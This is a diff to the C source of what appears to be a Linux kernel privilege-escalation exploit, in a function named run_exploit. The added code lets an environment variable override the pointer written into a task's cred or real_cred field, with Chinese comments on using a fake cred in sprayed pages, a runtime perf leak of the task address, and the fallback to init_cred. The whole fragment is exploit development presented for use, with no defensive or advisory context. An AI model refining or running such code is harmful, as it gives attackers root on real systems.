@@ -817,11 +817,24 @@ int run_exploit(int argc, char **argv) {
           size_t mt48_pc_off = (mt48_stage == 'R') ? (TASK_REAL_CRED_OFF - 8)
                                                    : TASK_REAL_CRED_OFF;
           snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(task + mt48_pc_off));
-          snprintf(right_env, sizeof(right_env), "%zx",
-                   (size_t)P0_DATA_ALIAS_CONST(INIT_CRED));
+          /* mt54 (spec2-repair): PSELECT_PTR_RIGHT 覆盖写死的 init_cred dmap
+           * 别名 — 修复轮写喷页假 cred (spray_base+0x3800, util.c mt35-era
+           * 全字段假 cred, security 块在 +0x3900)。GEOM_KEEP 救不了 PTR 轮:
+           * pc 必须来自运行时 perf 泄露的 task, 外部 env 无法预知, 所以只
+           * 放行 right 单项覆盖。落地前必核对 RUNLOG 的
+           * "mt48: PTR ... right=... [PTR_RIGHT override]" 行 — 没有该标记
+           * = 静默回落 init_cred = 2/2 致死几何。 */
+          char *mt54_ptr_right = getenv("PSELECT_PTR_RIGHT");
+          if (mt54_ptr_right) {
+            snprintf(right_env, sizeof(right_env), "%s", mt54_ptr_right);
+          } else {
+            snprintf(right_env, sizeof(right_env), "%zx",
+                     (size_t)P0_DATA_ALIAS_CONST(INIT_CRED));
+          }
           snprintf(left_env, sizeof(left_env), "0");
-          pr_info("mt48: PTR stage=%c task=%016zx pc=%s right=%s (STORE(a)→[%s])\n",
+          pr_info("mt48: PTR stage=%c task=%016zx pc=%s right=%s%s (STORE(a)→[%s])\n",
                   mt48_stage, (size_t)task, pc_env, right_env,
+                  mt54_ptr_right ? " [PTR_RIGHT override]" : "",
                   mt48_stage == 'R' ? "task+0x778 real_cred" : "task+0x780 cred");
           fflush(stdout);
         } else if (getenv("PSELECT_FIX_MODE")) {
